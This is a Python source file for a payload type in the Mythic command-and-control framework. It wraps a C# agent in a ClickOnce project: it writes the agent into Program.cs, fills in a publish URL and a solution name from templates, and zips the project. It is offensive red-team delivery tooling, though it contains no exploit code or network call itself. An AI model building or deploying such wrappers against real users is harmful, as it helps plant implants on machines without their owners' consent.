import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import subprocess
import json
import string
import os
import shutil
import base64
import random

from io import BytesIO
from pathlib import Path
import zipfile

from jinja2 import Template

def zip_folder_to_bytes(folder_path: str | Path) -> bytes:
    folder = Path(folder_path).resolve()
    buf = BytesIO()
    with zipfile.ZipFile(buf, mode="w", compression=zipfile.ZIP_DEFLATED, compresslevel=9) as zf:
        for p in folder.rglob("*"):
            if p.is_file():
                # Store relative path inside the ZIP
                zf.write(p, arcname=p.relative_to(folder))
    return buf.getvalue()

def apply_template(template_path, params_dict):
    if not template_path.endswith(".j2"):
        return

    with open(template_path) as f:
        template = f.read()

    template = Template(template)

    # Render the template with data
    data = template.render(**params_dict)

    with open(template_path[:-3], "w") as f:
        f.write(data)

    os.remove(template_path)


class clickonce_wraps_csharp(PayloadType):
    name = "clickonce_wraps_csharp"
    file_extension = "zip"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = ["csharp"]
    note = """Executes a C-sharp via ClickOnce"""
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "dotNet"
    agent_icon_path = agent_path / "agent_functions" / "dotnet.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "name",
            parameter_type=BuildParameterType.String,
            default_value="clickonce",
            description="Project name",
        ),
        BuildParameter(
            name = "url",
            parameter_type=BuildParameterType.String,
            description="ClickOnce publish URL",
        ),

    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            cs_code = self.wrapped_payload

            project_name = self.get_parameter("name")

            clickonce_code = "/tmp/clickonce"

            try:
                shutil.rmtree(clickonce_code)
            except:
                pass

            shutil.copytree(os.path.join(self.agent_code_path, "clickonce"), clickonce_code)

            with open(os.path.join(clickonce_code, "clickonce", "Program.cs"), "wb") as f:
                f.write(cs_code)

            publish_path_template = os.path.join(clickonce_code, "clickonce", "Properties", "PublishProfiles", "clickonce.pubxml.j2")
            apply_template(publish_path_template, {'url': self.get_parameter("url")})

            sln_template = os.path.join(clickonce_code, "clickonce.sln.j2")
            apply_template(sln_template, {'name': project_name})

            shutil.move(os.path.join(clickonce_code, "clickonce", "clickonce.csproj"), os.path.join(clickonce_code, "clickonce", "%s.csproj" % project_name))
            shutil.move(os.path.join(clickonce_code, "clickonce"), os.path.join(clickonce_code, project_name))

            payload = zip_folder_to_bytes(clickonce_code)

            resp.payload = payload
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp

